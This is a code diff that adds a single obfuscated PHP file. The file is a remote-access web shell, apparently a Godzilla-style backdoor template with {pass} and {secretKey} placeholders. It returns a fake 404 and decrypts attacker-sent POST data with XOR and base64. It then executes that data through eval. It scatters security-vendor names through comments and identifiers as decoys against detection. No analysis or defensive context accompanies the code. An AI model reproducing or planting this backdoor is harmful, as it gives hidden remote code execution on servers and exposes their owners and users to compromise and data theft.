@@ -1,0 +1,34 @@
+<?pHP
+http_response_code(404);
+@session_start();
+@set_time_limit/*sangfor5c8oEIR1z*/(Chr("48"));
+@error_reporting/*sangfor5c8oEIR1z*/(Chr("48"));
+function dbappsecuritypjYmTytxW(/*sangforO0Zg*/$dbappsecurityUcb,$dbappsecurityONxdGMP){
+    for($dbappsecuritymht=Chr("48");$dbappsecuritymht<strlen($dbappsecurityUcb);$dbappsecuritymht++) {
+        $dbappsecurity0jO = $dbappsecurityONxdGMP[$dbappsecuritymht+Chr("49")&15];
+        $dbappsecurityUcb[$dbappsecuritymht] = $dbappsecurityUcb[$dbappsecuritymht]^$dbappsecurity0jO;
+    }
+    return $dbappsecurityUcb;
+}
+$dbappsecurityJxLFgywiPji = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$dbappsecuritypjYmTytxW = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$dbappsecurityPBM='{pass}';
+$dbappsecurity3p5P='p'.$dbappsecurityJxLFgywiPji($dbappsecurityJxLFgywiPji("WVhsc2IyRms="));
+$dbappsecurityMzZEyeTbWwOJ='{secretKey}';
+if (isset($_POST/*sangforRVex9rnvO7E67*/[$dbappsecurityPBM])){
+    $dataliyunUH9=dbappsecuritypjYmTytxW/*sangfordKJ2vu*/($dbappsecurityJxLFgywiPji($dbappsecurityJxLFgywiPji($_POST[$dbappsecurityPBM])),$dbappsecurityMzZEyeTbWwOJ);
+    if (/*sangforpl*/isset($_SESSION/*sangforQ*/[$dbappsecurity3p5P])){
+        $dbappsecurity0hJNbn=dbappsecuritypjYmTytxW($_SESSION/*sangforzicnGpB6v1r*/[$dbappsecurity3p5P],$dbappsecurityMzZEyeTbWwOJ);
+        if (/*sangforKurNLrO11t6e0gx*/strpos($dbappsecurity0hJNbn,$dbappsecurityJxLFgywiPji/*sangforAiTzFP9RqT*/($dbappsecurityJxLFgywiPji("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $dbappsecurity0hJNbn=dbappsecuritypjYmTytxW/*sangforL1nPRiqZ*/($dbappsecurity0hJNbn,$dbappsecurityMzZEyeTbWwOJ);
+        }
+                define("dbappsecurityE9ngY54tvC7MZAE","//dbappsecurityxtnIg7E8E0SiFX\r\n".$dbappsecurity0hJNbn);
+/*nsfocus.com*/eval(/*nsfocus.com*/null.dbappsecurityE9ngY54tvC7MZAE/*nsfocus.com*/);echo "{\"message\":\"";echo $dbappsecuritypjYmTytxW(dbappsecuritypjYmTytxW(@run($dataliyunUH9),$dbappsecurityMzZEyeTbWwOJ));echo "\"}";
+    }else{
+        if (strpos/*sangforVMMcxsen7UThdhn*/($dataliyunUH9,$dbappsecurityJxLFgywiPji($dbappsecurityJxLFgywiPji("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$dbappsecurity3p5P]=dbappsecuritypjYmTytxW($dataliyunUH9,$dbappsecurityMzZEyeTbWwOJ);
+        }
+    }
+}
+?>
+
